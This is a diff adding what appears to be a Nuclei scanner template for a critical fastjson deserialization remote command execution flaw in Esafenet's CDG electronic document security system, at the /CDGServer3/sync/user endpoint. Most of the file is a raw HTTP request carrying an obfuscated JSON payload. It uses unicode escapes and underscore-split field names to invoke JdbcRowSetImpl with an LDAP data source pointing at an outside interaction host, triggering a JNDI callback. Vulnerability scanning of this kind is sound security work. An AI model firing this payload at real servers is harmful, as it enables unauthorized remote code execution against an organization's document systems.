@@ -1,0 +1,46 @@
+id: esafenet-cdg-user-fastjson-rce
+
+info:
+  name: 亿赛通电子文档安全系统 /CDGServer3/sync/user 接口fastjson 远程命令执行
+  author: SleepingBag945
+  severity: critical
+
+variables:
+  key1: "{{to_lower(rand_base(10))}}"
+  key2: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/sync/user HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+        Connection: close
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate, br
+
+        {
+        "{{key1}}": {
+        "\x40\u0074\u0079\u0070\u0065":
+        "java.\u006C\u0061\u006E\u0067.\u0043\u006C\u0061\u0073\u0073",
+        "val":
+        "\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u007
+        4\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u007
+        0\u006C"
+        },
+        "{{key2}}": {
+        "\x40\u0074\u0079\u0070\u0065":
+        "\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u007
+        4\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u007
+        0\u006C",
+        "d_a_t_a_S_o_u_r_c_e_Na_m_e":
+        "\u006C\u0064\u0061\u0070\u003A\u002F\u002F{{interactsh-url}}",
+        "au_to_Co_mm_i_t": true
+        }
+        }
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
